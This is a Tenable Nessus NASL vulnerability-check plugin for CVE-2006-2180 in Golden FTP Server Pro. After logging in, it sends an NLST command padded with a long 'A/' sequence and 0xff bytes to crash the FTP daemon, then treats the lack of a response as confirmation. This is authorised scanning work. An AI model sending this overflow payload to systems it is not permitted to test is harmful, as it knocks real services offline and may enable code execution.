#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(21325);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2006-2180");
  script_bugtraq_id(17801);
  script_xref(name:"OSVDB", value:"25217");
 
  script_name(english:"Golden FTP Server Pro Multiple Command Remote Overflow DoS");
  script_summary(english:"Checks for NLST command buffer overflow vulnerability in Golden FTP Server");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a buffer overflow flaw." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be using Golden FTP Server, a personal FTP
server for Windows. 

The version of Golden FTP Server installed on the remote host contains
a buffer overflow vulnerability that can be exploited by an
authenticated, possibly anonymous, user with a specially-crafted NLST
command to crash the affected application or execute arbitrary code on
the affected host." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2006-05/0023.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:P" );
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  exit(0);
}


include("ftp_func.inc");
include("global_settings.inc");


port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);


# nb: to exploit the vulnerability we need to log in.
user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");
if (!user || !pass) exit(0);


soc = open_sock_tcp(port);
if (!soc) exit(0);
if (!ftp_authenticate(socket:soc, user:user, pass:pass))
{
  close(soc);
  exit(1, "cannot login with supplied FTP credentials");
}


# Make sure it's Golden FTP Server.
c = string("SYST");
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:4096);
if ("215 WIN32" >!< s) exit(0);


# Try to exploit the flaw to crash the daemon.
evil = "NLST /";
for (i=1; i<=120; i++) evil += "A/";
c = string(evil, crap(data:raw_string(0xff), length:700));
send(socket:soc, data:string(c, "\r\n"));
s = ftp_recv_line(socket:soc);


# If we didn't get a response...
if (isnull(s))
{
  # Check whether it's truly down.
  soc2 = open_sock_tcp(port);

  if (soc2) close(soc2);
  else security_warning(port);

  exit(0);
}


ftp_close(socket:soc);
